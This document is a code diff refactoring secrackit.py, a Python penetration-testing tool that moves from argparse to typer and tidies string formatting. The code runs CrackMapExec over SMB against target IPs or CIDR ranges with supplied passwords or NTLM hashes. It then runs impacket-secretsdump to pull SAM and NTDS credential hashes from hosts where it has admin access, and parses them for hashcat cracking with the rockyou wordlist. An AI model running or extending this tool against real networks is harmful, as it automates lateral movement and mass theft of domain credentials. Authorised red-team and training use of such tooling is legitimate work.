@@ -71,16 +71,44 @@
 #######################
 #### Imports below ####
 
+from ast import Pass
+from enum import Enum
+import io
 import subprocess
-import argparse
 import ipaddress
 import re
 import sys
 import os
+import typing
+import typer
+from pathlib import Path
 from datetime import datetime
+from typing import Annotated, Optional
 
 #### Imports above ####
 #######################
+
+
+#######################
+#### Globals below ####
+app = typer.Typer()
+
+#### Globals above ####
+#######################
+
+
+#######################
+### Types below #######
+class PasswordOrHashChoice(str, Enum):
+	password = "pw"
+	ntlm = "ntlm"
+
+PasswordSwitch = typing.Literal["-p", "-H"]
+
+### Types above #######
+#######################
+
+
 
 
 ######################
@@ -88,7 +116,7 @@ from datetime import datetime
 
 # Creates a folder, within the same directory as secrackit.py, with a naming scheme:
 # "Month-Day-Year_Hour-Minute-Second"
-def create_dir_for_dropping_that_output(user_input_dir_location):
+def create_dir_for_dropping_that_output(user_input_dir_location: Path):
 
 	# Check for current date and time and assign to "now" var.
 	now = datetime.now()
@@ -96,255 +124,72 @@ def create_dir_for_dropping_that_output(user_input_dir_location):
 	# Assign "currenttime" var to a specific date/time format as this will be in the folder's name. 
 	currenttime = now.strftime('%m-%d-%y_%H-%M-%S_secrackit')
 
-	# Check if user input was provided via the -out_dir flag.
-	# If argparse sees no -out_dir flag, it will have a value of "None".
-	if user_input_dir_location == None:
-
-
-		# Try except statement for error catching, so user isn't lost if script errors.
-		try:
-
-			# Find path secrackit.py is running from and save in var "currentdir" with appended "/" forward slash, as it's needed for os.mkdir() method to work.
-			tempdir = os.path.dirname(os.path.realpath(__file__))
-			currentdir = tempdir + '/'
-
-			# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created. 
-			createfolder = (currentdir + currenttime)
-
-			# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
-			os.mkdir(createfolder)
-
-			# Return full path of directory created, so we can place results into correct directory.
-			return(createfolder + "/")
-
-			# Catch error. Not sure what would preset this error, as there's other checks beforehand, but safe than sorry.
-
-		except:
-
-			sys.exit(user_input_dir_location + " is not allowing file creation... weird!")
-
-	# If "user_input_dir_location" parameter is equal to 1, argparse has detected that the flag -out_dir is present BUT no argument was provided.
-	elif user_input_dir_location == 1:
-		sys.exit("\n\n\nYou forgot to enter a directory value for the -out_dir flag!\n\nHow the -out_dir flag works:\nA new (date/time) directory will be created within the directory specified by -out_dir flag.\nE.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\nThis (date/time) directory will contain the output from any successful attacks.\nBy default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from.")
-
-	# Last scenario for parameter "user_input_dir_location" falls under this else block.
-	# This represents user providing both the -out_dir flag and argument. E.g., "~/Desktop"
-	# It works for either input including or excluding the appended "/" forward slash.
-	# If user provides "/" in location, os.mkdir() will create directory as E.g., "~/Desktop//"
-	else:
-
-		# Try except statement to create or catch error.
-		try:
-			# Append "/" to user_input_dir_location.
-			currentdir = user_input_dir_location + '/'
-
-			# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created.
-			createfolder = (currentdir + currenttime)
-
-			# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
-			os.mkdir(createfolder)
-
-			# Return full path of directory created, so we can place results into correct directory.
-			return(createfolder + "/")
-
-		# Catch error when directory user provided doesn't actually exist. Yes, you can use os.mkdirs(), not the "s", BUT I don't want the script making accidental directories.
-		except:
-			sys.exit("\n\n\nDirectory location: \"" + user_input_dir_location + "\" does not exist!\nCreate the directory and retry.\n\nHow the -out_dir flag works:\nA new (date/time) directory will be created within the directory specified by -out_dir flag.\nE.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\nThis (date/time) directory will contain the output from any successful attacks.\nBy default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from.")
-
-
-
-
-# Check if "user_input_wordlist_loc" aka "-wordlist" is set or not, then check for valid file location.
-def validate_wordlist_input(user_input_wordlist_loc):
-
-	# Check to see if optional argument is present
-	if user_input_wordlist_loc == None:
-
-		try:
-
-			# Set new var "default_user_input_wordlist_loc" to default Kali rockyou location.
-			default_user_input_wordlist_loc = ("/usr/share/wordlists/rockyou.txt")
-
-			# Return new var "default_user_input_wordlist_loc" value back to function call.
-			return(default_user_input_wordlist_loc)
-
-		# On error... which shouldn't happen...
-		except:
-
-			sys.exit("Error setting wordlist location to default \"/usr/share/wordlists/rockyou.txt\".. weird...")
-
-	# else if "user_input_wordlist_loc" argument is present but NO value set, prompt user.
-	elif user_input_wordlist_loc == 1:
-
-		sys.exit("\n\"-wordlist\" argument present but no wordlist location followed.\n\nIf you want to use a custom wordlist for Hashcat, please enter wordlist location after the \"-wordlist\" argument,\nelse remove \"-wordlist\" and make sure the file \"/usr/share/wordlists/rockyou.txt\" is present!\n\nNo scripts ran, no folders created!")
-
-
-	else:
-		
-		# Does the "user_input_wordlist_loc" exist as a file?
-		is_wordlist_file = os.path.isfile(user_input_wordlist_loc)
-
-		# If "is_wordlist_file" is true(present), run code block.
-		if is_wordlist_file:
-
-			# Assign var "custom_wordlist_present" to user input and return value.
-			custom_wordlist_present = user_input_wordlist_loc
-
-			# return "custom_wordlist_present"
-			return(custom_wordlist_present)
-
-		else:
-
-			# Throw error to user stating file does not exist...
-			sys.exit("\nWrong wordlist location entered? Does wordlist exists?: " + user_input_wordlist_loc + "\n\nPlease verify location syntax of the wordlist file and make sure the wordlist file does indeed exist,\nelse remove the \"-wordlist\" argument to run the default \"/usr/share/wordlists/rockyou.txt\" wordlist with Hashcat.\n\n\nNo scripts ran, no folders created!")
-
-
-
-
-# Validate if "-rule" argument is present. If so, validate file loc. Else run without a rule.
-# If -rule is missing(value = None), I'll use that to determine which hashcat function to run.
-def validate_rule_input(user_input_rule_loc):
-
-	# if "-rule" argument is absent(value = None), return None value to use later at run_hashcat functions.
-	if user_input_rule_loc == None:
-
-		# Return None value
-		return(user_input_rule_loc)
-
-
-	# If "-rule" is present but no value follows(value = 1), throw error.
-	elif user_input_rule_loc == 1:
-
-		sys.exit("\n\"-rule\" argument present but no rule location followed.\n\nIf you want to use a custom rule with Hashcat, please enter rule location after the \"-rule\" argument,\nelse remove \"-rule\", so Hashcat can run without.\n\nNo scripts ran, no folders created!")
-
-
-	else:
-
-		# Check if rule file does exists.
-		is_rule_loc = os.path.isfile(user_input_rule_loc)
-
-		# If "is_rule_loc" is true(present), run code block.
-		if  is_rule_loc:
-
-			# Assign custom rule argument value to "customer_rule_present" var and return it.
-			custom_rule_present = user_input_rule_loc
-
-			# return "custom_rule_present"
-			return(custom_rule_present)
-
-		else:
-
-			# Throw error to user stating the location of the "-rule" argument is not present
-			sys.exit("\nWrong rule location entered? Does rule exists?: " + user_input_rule_loc + "\n\nPlease verify location syntax of the rule file and make sure the rule file does indeed exist,\nelse remove \"-rule\" argument to run no rule with Hashcat.\n\n\nNo scripts ran, no folders created!")
-
-
-	return(user_input_rule_loc)
-
-
-
-
-# Converts the required argparse option, "pw" or "ntlm", to either -p or -H respectively.
-# This conversion is needed as CME will need either "-p" for password or "-H" for hash.
-def convert_pw_or_hash_flag(needs_converted_pw_hash_flag):
-
-	# If code block for converting "pw" to "-p".
-	if needs_converted_pw_hash_flag == "pw":
-		
-		# "converted_pw" var holds the string replacement.
-		converted_pw = needs_converted_pw_hash_flag.replace("pw", "-p")
-
-		# Return "converted_pw" for CME function later.
-		return(converted_pw)
-
-	# elif code block for converting "ntlm" to "-H".
-	elif needs_converted_pw_hash_flag == "ntlm":
-
-		# "converted_hash" car hold the string replacement".
-		converted_hash = needs_converted_pw_hash_flag.replace("ntlm", "-H")
-
-		# Retuen "converted_hash" for CME function later.
-		return(converted_hash)
-
-	# else code block for handling any input errors.
-	else:
-
-		# This error should not happen as argparse should catch a missing required argument.
-		sys.exit("Failure happened in 'convert_pw_or_hash_flag' function.")
-
-
-
+	# Try except statement to create or catch error.
+	try:
+		# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created.
+		createfolder = os.path.join(user_input_dir_location, currenttime)
+
+		# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
+		os.mkdir(createfolder)
+
+		# Return full path of directory created, so we can place results into correct directory.
+		return createfolder + "/"
+
+	# Catch error when directory user provided doesn't actually exist. Yes, you can use os.mkdirs(), not the "s", BUT I don't want the script making accidental directories.
+	except:
+		sys.exit(
+			"\n"
+			"\n"
+			"\n"
+			f"Directory location: \"{user_input_dir_location}\" does not exist!\n"
+			"Create the directory and retry.\n"
+			"\n"
+			"How the -out_dir flag works:\n"
+			"A new (date/time) directory will be created within the directory specified by -out_dir flag.\n"
+			"E.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\n"
+			"This (date/time) directory will contain the output from any successful attacks.\n"
+			"By default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from."
+		)
 
 # Validates if the provided IP or CIDR address, either entered at terminal or provided in a file, is/are correctly formatted.
 # E.g., 192.168.1.1 or 10.10.10.0/24
 # If a file containing IPs or CIDR formats was inputted, check IP or CIDR for typos and report error.
 # Also make sure the file presented actually exists.
-def validate_target_ips(user_input_target_ips):
-
-	# Does the "user_input_target_ips" exist as a file?
-	is_input_file = os.path.isfile(user_input_target_ips)
-
-	# If "is_input_file" is true(present), run code block.
-	if is_input_file:
-
-		# Open "user_input_target_ips" file in read mode.
-		file_of_IPs = open(user_input_target_ips, 'r')
-
-		# For each IP in "user_input_target_ips", loop...
-		for IP in file_of_IPs:
-
-			# Strip each line and try...
-			IP = IP.strip()
-			try:
-
-				# Check each line for a IP network aka 192.168.1.0/24 format.
-				ipaddress.ip_network(IP)
-
-				# If not an network ID, except, try...
-
-			except:
-
-				try:
-
-					# Check each line for an IP address aka 192.168.1.1 format.			
-					ipaddress.ip_address(IP)
-
-				except:
-
-					# If either network or address fail, sys.exit with message.
-					sys.exit("\nInvalid IP format: " + IP + "\nFound within file: " + user_input_target_ips + "\n\nMake sure each IP and/or CIDR are formatted line by line.\n\nExample:\n192.168.1.1\n192.168.1.10\n10.10.10.0/24\n")
-
-		return(user_input_target_ips)
-
-	# If input is not a file, check user input for correct IP address or CIDR format.
-
-	else:
-
+def validate_target_ips(user_input_target_ips: io.TextIOWrapper):
+	# For each IP in "user_input_target_ips", loop...
+	ips = user_input_target_ips.readlines()
+	print(ips)
+	for ip in ips:
+		print(ip)
+		# Strip each line and try...
+		ip = ip.strip()
 		try:
-
-			# Check "user_input_target_ips" for IP network format. If true, return "user_input_target_ips".
-			ipaddress.ip_network(user_input_target_ips)
-			return(user_input_target_ips)
-
-		# If not a network ID format, check for IP address format.
+			# Check each line for a IP network aka 192.168.1.0/24 format.
+			ipaddress.ip_network(ip)
+		# If not an network ID, except, try...
 		except:
-
 			try:
-
-				# Check "user_input_target_ips" for IP address format. If true, return "user_input_target_ips".
-				ipaddress.ip_network(user_input_target_ips)
-				return(user_input_target_ips)
-
-			# If "user_input_target_ips" is neither, throw sys.exit() with message.
+				# Check each line for an IP address aka 192.168.1.1 format.			
+				ipaddress.ip_address(ip)
 			except:
+				# If either network or address fail, sys.exit with message.
+				sys.exit(
+			  		f"Invalid IP format: {ip}\n"
+					f"Found within file: {user_input_target_ips.name}\n"
+					"\n"
+					"Make sure each IP and/or CIDR are formatted line by line.\n"
+					"\n"
+					"Example:\n"
+					"192.168.1.1\n"
+					"192.168.1.10\n"
+					"10.10.10.0/24\n"
+				)
 
-				sys.exit("\nInvalid IP/CIDR format or file location: " + user_input_target_ips + "\n\nValid IP inputs:\nSingle IP - 192.168.1.1\nCIDR - 192.168.1.0/24\nFile - containing target IP addresses or CIDR.\n\nIf you'd like to attack many different hosts, input a file holding IPs or CIDRs, formatted line by line!\n\nExample:\n192.168.1.1\n192.168.1.10\n10.10.10.0/24\n")
-				
-
-
+	return(user_input_target_ips)
 
 # If "ntlm" argument inputted, verify if NTLM hash is indeed NLTM format.
 # If "pw" inputted, verify if password is indeed a password and NOT a NTLM hash. 
-def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, converted_pw_hash_flag):
+def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value: str, converted_pw_hash_flag: PasswordSwitch):
 	
 	# Define special characters that don't exist in NTLM hashes.
 	special_chars = set("[@_!#$%^&*()<>?/\|}{~]")
@@ -359,23 +204,52 @@ def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, conve
 
 		# If 32 in length and no special characters are found, either a LM or NT hash found. Chances of this being a password are slim. Throw error with message.
 		elif len(user_input_password_or_ntlm_value) == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
-				sys.exit("\nWrong hash format!\n\nIf flag was meant for 'ntlm', please enter NTLM hash in the following LM:NT format:\n'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\nNo network tools ran!\nIf this was indeed a 32 character password with no special characters, let me know. I'll work on a fix!")
+			sys.exit(
+				"\n"
+				"Wrong hash format!\n"
+				"If flag was meant for 'ntlm', please enter NTLM hash in the following LM:NT format:\n"
+				"'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n"
+				"\n"
+				"No network tools ran!\n"
+				"If this was indeed a 32 character password with no special characters, let me know. I'll work on a fix!\n"
+			"")
 
 		else:
 
 			# Was a password entered when the 'ntlm' flag was set? Prompt user with direction.
-			sys.exit("\nDid you mean to enter a password or NTLM hash? \nCheck password/NTLM value entered AND if 'ntlm' flag was meant for 'pw'!\n\nRemember to enter NTLM hash in the following LM:NT format:\n'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\nNo network tools ran!")
+			sys.exit(
+				"\n"
+				"Did you mean to enter a password or NTLM hash? \n"
+				"Check password/NTLM value entered AND if 'ntlm' flag was meant for 'pw'!\n"
+				"\n"
+				"Remember to enter NTLM hash in the following LM:NT format:\n"
+				"'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n"
+				"\n"
+				"No network tools ran!"
+			)
 
 	# Verify if password is actually a hash and prompt user as needed.
 	elif converted_pw_hash_flag == "-p":
 
 		# If NTLM hash, prompt user to check 'pw' flag and review. Wrong flag set?
 		if len(user_input_password_or_ntlm_value) == 65 and user_input_password_or_ntlm_value.index(":") == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
-			sys.exit("\nPossible NTLM hash entered with \"pw\" flag set.\nCheck password/NTLM hash value entered OR if the \"pw\" flag was meant for \"ntlm\"!\n\nNo network tools ran!")
+			sys.exit(
+				"\n"
+				"Possible NTLM hash entered with \"pw\" flag set.\n"
+				"Check password/NTLM hash value entered OR if the \"pw\" flag was meant for \"ntlm\"!\n"
+				"\n"
+				"No network tools ran!"
+			)
 		
 
 		elif len(user_input_password_or_ntlm_value) == 32 and not set(":").intersection(user_input_password_or_ntlm_value) == ":":
-			sys.exit("\nFlag 'pw' is set for password and password/hash value is 32 characters in length with no special characters?\nCheck password/hash value entered OR if the 'pw' flag was meant for 'ntlm'!\n\nNo network tools ran!")
+			sys.exit(
+				"\n"
+				"Flag 'pw' is set for password and password/hash value is 32 characters in length with no special characters?\n"
+				"Check password/hash value entered OR if the 'pw' flag was meant for 'ntlm'!\n"
+				"\n"
+				"No network tools ran!"
+			)
 
 		else:
 
@@ -387,7 +261,12 @@ def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, conve
 
 		# This error shouldn't happen as argparse should catch no value when the "Pass_or_NTLM_val" is required input.
 		len(user_input_password_or_ntlm_value) == 0
-		sys.exit("\nNo value was entered into the password/hash field.. How did you end up here?\n\nNo network tools ran!")
+		sys.exit(
+			"\n"
+			"No value was entered into the password/hash field.. How did you end up here?\n"
+			"\n"
+			"No network tools ran!"
+		)
 
 
 
@@ -396,7 +275,7 @@ def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, conve
 # Returns string as raw, ANSI riddled output.
 
 # CME takes in target(s) IP/CIDR, converted pw-ntlm flag, Pass_or_NTLM_val, along with the username and -localauth flag.
-def run_crackmapexec_against_local(user_input_target_ips, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag):
+def run_crackmapexec_against_local(user_input_target_ips: io.TextIOWrapper, user_input_username: str, converted_pw_hash_flag: PasswordSwitch, validated_NTLM_hash_or_password: str, user_input_local_flag: bool):
 
 	# If argparse "user_input_local_flag" value equal to True...
 	if user_input_local_flag == True:
@@ -409,14 +288,21 @@ def run_crackmapexec_against_local(user_input_target_ips, user_input_username, c
 
 		# Terminal feed showing the overall options being ran.
 		# If IP argument is a file, only the file name is presented.
-		print("\nRunning CrackMapExec with the following options:\n  Local or Domain Auth? = " + local + "\n  Target IP, CIDR, or File = " + user_input_target_ips + "\n  Username = " + user_input_username + "\n  NTLM or Password = " + validated_NTLM_hash_or_password + "\n")
+		print(
+			"\n"
+			"Running CrackMapExec with the following options:\n"
+			f"  Local or Domain Auth? = {local}\n"
+			f"  Target IP, CIDR, or File = {user_input_target_ips}\n"
+			f"  Username = {user_input_username}\n"
+			f"  NTLM or Password = {validated_NTLM_hash_or_password}\n"
+		)
 	else:
 		# This error shouldn't happen in normal OP.
 		sys.exit("--local-auth not set but running under local authentication?")
 
 	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
 	# Passing the needed arguments into CME. Specifying "local_flag" for local auth only.
-	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips, "-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_flag], capture_output=True)
+	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips.name, "-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_flag], capture_output=True)
 
 	# To convert the byte output to string.
 	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()
@@ -427,26 +313,40 @@ def run_crackmapexec_against_local(user_input_target_ips, user_input_username, c
 
 	# "Pwn3d" means both successful authentication and administrative access.
 	if (("[+]" in crackmapexec_cmd_to_str and "Pwn3d" in crackmapexec_cmd_to_str)):
-		print("\nLOCAL authentication and administrative access found!\n")
+		print(
+			"\n"
+			"LOCAL authentication and administrative access found!\n"
+		)
 
 		return(crackmapexec_cmd_to_str)
 
 	# If account authenticates but doesn't have administrative rights...
 	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
 	elif ("[+]" in crackmapexec_cmd_to_str):
-		print("\nLOCAL authentication found. Administrative access unknown!\nSuccessful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n")
+		print(
+			"\n"
+			"LOCAL authentication found. Administrative access unknown!\n"
+			"Successful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n"
+		)
 
 		return(crackmapexec_cmd_to_str)
 
 	# Unsure this situation can happen but why not define it...
 	elif ("Pwn3d" in crackmapexec_cmd_to_str):
-		print("\nConfirmed LOCAL administrative access but LOCAL authentication unconfirmed!\n")
+		print(
+			"\n"
+			"Confirmed LOCAL administrative access but LOCAL authentication unconfirmed!\n"
+		)
 
 		return(crackmapexec_cmd_to_str)
 
 	else:
 		# If authentication failed all together, this message is thrown.
-		sys.exit("\nLOCAL authentication failed against ALL targets...\nPlease try again with new credentials, targets, and/or DOMAIN level authentication(remove -localauth flag).")	
+		sys.exit(
+			"\n"
+			"LOCAL authentication failed against ALL targets...\n"
+			"Please try again with new credentials, targets, and/or DOMAIN level authentication(remove -localauth flag)."
+		)	
 
 
 
@@ -455,20 +355,27 @@ def run_crackmapexec_against_local(user_input_target_ips, user_input_username, c
 # Returns string of raw, ANSI riddled output.
 
 # CME takes in validated Target IPs, converted pw-ntlm flag, NTLM or Password, along with user input domain. Local flag passed for debugging.
-def run_crackmapexec_against_domain(user_input_target_ips, user_input_domain, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag):
+def run_crackmapexec_against_domain(user_input_target_ips: io.TextIOWrapper, user_input_domain: str, user_input_username: str, converted_pw_hash_flag: PasswordSwitch, validated_NTLM_hash_or_password: str, user_input_local_flag: bool):
 
 	# Terminal feed showing the overall options being ran.
 	# If IP argument is a file, only the file name is presented.
 	if user_input_local_flag == False:
 		domain = "Domain"
-		print("\nRunning CrackMapExec with the following options:\n  Local or Domain Auth? = " + domain + "\n  Target IP, CIDR, or File = " + user_input_target_ips + "\n  Username = " + user_input_username + "\n  NTLM or Password = " + validated_NTLM_hash_or_password + "\n")
+		print(
+			"\n"
+			"Running CrackMapExec with the following options:\n"
+			f"  Local or Domain Auth? = {domain}\n"
+			f"  Target IP, CIDR, or File = {user_input_target_ips.name}\n"
+			f"  Username = {user_input_username}\n"
+			f"  NTLM or Password = {validated_NTLM_hash_or_password}\n"
+		)
 	else:
 		# Error for debugging purposes. Shouldn't flag during normal OP.
 		sys.exit("--local-auth set but running under domain authentication?")
 
 	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
 	# Passing the needed arguments into CME. Specifying "-d" for domain auth.
-	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips, "-d", user_input_domain,"-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password], capture_output=True)
+	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips.name, "-d", user_input_domain,"-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password], capture_output=True)
 
 	# To convert the byte output to string.
 	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()
@@ -486,7 +393,11 @@ def run_crackmapexec_against_domain(user_input_target_ips, user_input_domain, us
 	# If account authenticates but doesn't have administrative rights...
 	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
 	elif ("[+]" in crackmapexec_cmd_to_str):
-		print("\nDOMAIN authentication found. Administrative access unknown!\nSuccessful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n")
+		print(
+			"\n"
+			"DOMAIN authentication found. Administrative access unknown!\n"
+			"Successful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n"
+		)
 
 		return(crackmapexec_cmd_to_str)
 
@@ -498,12 +409,16 @@ def run_crackmapexec_against_domain(user_input_target_ips, user_input_domain, us
 
 	else:
 		# If authentication failed all together, this message is thrown.
-		sys.exit("\nDOMAIN authentication failed against ALL targets...\nPlease try again with new credentials, targets, and/or LOCAL level authentication(add -localauth flag).")
+		sys.exit(
+			"\n"
+			"DOMAIN authentication failed against ALL targets...\n"
+			"Please try again with new credentials, targets, and/or LOCAL level authentication(add -localauth flag)."
+		)
 
 
 
 # Remove ANSI escape from the CME output...
-def remove_ansi_escape(run_crackmapexec_function_output):
+def remove_ansi_escape(run_crackmapexec_function_output: str):
 
 	# Var "ansi_escape_chars" is regex compile of all ANSI characters to remove.
 	ansi_escape_chars = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
@@ -517,29 +432,17 @@ def remove_ansi_escape(run_crackmapexec_function_output):
 
 
 # Create CME data file where CME raw output will be exported to.
-def cme_data_file(directory_location, NetworkID_for_files):
-
-	# var "cme_data_location" contained directory location plus string and networkID
-	cme_data_location = directory_location + "cme_data_" + str(NetworkID_for_files) + ".txt"
-
-	# Return cmd_data_location, so it can be called upon later on.
-	return(cme_data_location)
-
+def cme_data_file(directory_location: str, NetworkID_for_files: str):
+	return f'{directory_location}cme_data_{NetworkID_for_files}.txt'
 
 
 # Exports ANSI free CME output to a file.
 # File located where user specified or in default location(aka where secrackit.py ran from). 
-def export_CME_to_file(removed_ansi_CME_output, cmd_data_file_location):
-
+def export_CME_to_file(removed_ansi_CME_output: str, cmd_data_file_location: str):
 	# Open new file with append permission.
-	export_CME_data = open(cmd_data_file_location, "a")
-
-	# Write "removed_ansi_CME_output" to opened file.
-	export_CME_data.write(removed_ansi_CME_output)
-
-	# Close file, so it's no longer in use.
-	export_CME_data.close()
-
+	with open(cmd_data_file_location, "a") as export_CME_data:
+		# Write "removed_ansi_CME_output" to opened file.
+		export_CME_data.write(removed_ansi_CME_output)
 
 
 # Take in CME string output and remove unwanted characters from string.
@@ -588,12 +491,12 @@ def convert_parsed_CME_to_list(parsed_CME_string):
 	# Reason to include non-admin authenticated is that I've heard others have successful secretsdump even when CME doesn't show the access as "Pwn3d"... So I'm playing it safe...
 	number_of_admin_auth = sum('Pwn3d' in s for s in removed_failed_auth)
 	number_of_targets = str(len(removed_failed_auth))
-	print(str(number_of_admin_auth) + " of " + str(number_of_targets) + " targets provide administrative access!\n")
+	print(f"{number_of_admin_auth} of {number_of_targets} targets provide administrative access!\n")
 
 	# This prints the cleaned, simply CME results on terminal for user.
 	print("CME Results:")
-	for i in range(0, len(removed_failed_auth)):
-		print(removed_failed_auth[i])
+	for failed_auth in removed_failed_auth:
+		print(failed_auth)
 
 	# Return simple, cleaned CME results.
 	clean_CME_results = removed_failed_auth
@@ -613,7 +516,10 @@ def create_IP_list(CME_string_to_list):
 
 	# For each in list, append to IP_list.
 	for asset in CME_string_to_list:
-		IP_list.append(IP_pattern.search(asset)[0])
+		result = IP_pattern.search(asset)
+		if not result:
+			continue
+		IP_list.append(result[0])
 
 	# Return new IP_list.
 	return(IP_list)
@@ -631,6 +537,9 @@ def make_networkID(IP_list_for_secretsdump):
 	# "NetworkID" holds the output of re.search, which looks for pattern against index[0].
 	network_ID = re.search(IP_pattern, IP_address)
 
+	if not network_ID:
+		sys.exit("No NetworkID found... Exiting...")
+
 	# "IP_to_file" holds NetworkID pulled from group(0) of re.search outcome.
 	IP_to_file = (network_ID.group(0))
 
@@ -643,45 +552,27 @@ def make_networkID(IP_list_for_secretsdump):
 def run_impacket_secretsdump(user_input_domain, user_input_username,validated_NTLM_hash_or_password, IP_list_for_secretsdump):
 
 	# "secretsdump_subprocess" var holds secretsdump results.
-	secretsdump_subprocess = subprocess.run(["impacket-secretsdump", user_input_domain + '/' + user_input_username + ':' + validated_NTLM_hash_or_password + '@' + str(IP_list_for_secretsdump)], capture_output=True)
+	secretsdump_subprocess = subprocess.run(["impacket-secretsdump", f"{user_input_domain}/{user_input_username}:{validated_NTLM_hash_or_password}@{IP_list_for_secretsdump}"], capture_output=True)
 
 	# Convert byte code to string.
 	secretsdump_output_to_str = secretsdump_subprocess.stdout.decode()
 
 	# Prepend and append some designations to result, so parsing/browsing is easier.
-	prepend_IP_to_results = ("=== Beginning of results for " + str(IP_list_for_secretsdump) + " ===\n" + secretsdump_output_to_str + "=== Ending of results for " + str(IP_list_for_secretsdump) + " ===\n")
+	prepend_IP_to_results = f"=== Beginning of results for {IP_list_for_secretsdump} ===\n{secretsdump_output_to_str}=== Ending of results for {IP_list_for_secretsdump} ===\n"
 
 	# Return results.
 	return(prepend_IP_to_results)
 
 
-
-# Secretsdump raw file location with NetworkID naming scheme.
-def secretsdump_raw_file(NetworkID_for_files, directory_location):
-
-	# var for holding location of secretsdump raw file
-	secretsdump_raw_file = directory_location + "secretsdump_data_" + str(NetworkID_for_files) + ".txt"
-
-	# Return result
-	return(secretsdump_raw_file)
-
-
-
 # Export raw var "secretsdump_raw_list" to new file in created folder.
-def export_secretsdump_raw_list(secretsdump_raw_list, secretsdump_raw_file_location):
+def export_secretsdump_raw_list(secretsdump_raw_list: list[str], secretsdump_raw_file_location: str):
 
-	# Open new file with write permission with naming convention.
-	export_secretsdump_data = open(secretsdump_raw_file_location, "a")
-
-	# For each dump write to file with separating "#" symbols.
-	for dump in range(0, len(secretsdump_raw_list)):
-	
-		# Write "secretsdump_raw_list" to opened file.
-		export_secretsdump_data.write(secretsdump_raw_list[dump] + "\n\n" + "#######################################################\n\n\n")
-
-	# Close file, so it's no longer in use.
-	export_secretsdump_data.close()
-
+	with open(secretsdump_raw_file_location, "a") as export_secretsdump_data:
+		# For each dump write to file with separating "#" symbols.
+		for dump in secretsdump_raw_list:
+		
+			# Write "secretsdump_raw_list" to opened file.
+			export_secretsdump_data.write(dump + "\n\n" + "#######################################################\n\n\n")
 
 
 # Parse SAM section from secretsdump results and prepend "SAM-" before each.
@@ -761,7 +652,10 @@ def remove_NTDS_section(secretsdump_raw_list):
 
 
 # Zip both SAM and NTDS list of lists via row-wise.
-def combine_convert_SAM_and_NTDS_results(SAM_section_parsed, NTDS_section_parsed):
+def combine_convert_SAM_and_NTDS_results(
+		SAM_section_parsed: list[str | None], 
+		NTDS_section_parsed: list[str | None]
+	):
 	
 	# variable holding list of zipped list of lists, creating a list of tuples.
 	combined_SAM_NTDS_tuple = list(zip(SAM_section_parsed, NTDS_section_parsed))
@@ -784,6 +678,9 @@ def parse_IP_from_secrets(secretsdump_raw_list):
 	# var "search_IP" holds results of of re.search
 	search_IP = re.search(IP_pattern, secretsdump_raw_list)
 
+	if not search_IP:
+		sys.exit("No IP found... Exiting...")
+
 	# extract group 0 which contains the IP from search
 	current_IP = (search_IP.group(0))
 
@@ -796,7 +693,7 @@ def parse_IP_from_secrets(secretsdump_raw_list):
 # From my testing, hashcat only likes one semi-colon in a hash input.
 # So I replace the first two occurrences of ":"(semicolon) with a "-"(dash).
 # Goal is... Hashcat will ingest IP-{SAM, NTDS}-{domain.name}\\username-RID:LThash:NThash with module 1000(-m 1000).
-def parsed_secretsdump_list(combined_SAM_NTDS_results):
+def parsed_secretsdump_list(combined_SAM_NTDS_results: str):
 
 	# regex pattern re compiles - {SAM NTDS}-{domain.name\\}ACCOUNT-RID-LT:NT
 	NTLM_pattern = re.compile(r'([A-Z]*[-][A-Za-z0-9\\\^\$\.\|\?\*\+\(\)\{\}]*[A-Za-z0-9\$\-]*[:][0-9]*[:][a-z0-9A-Z]{32}[:][a-zA-Z0-9]{32})')
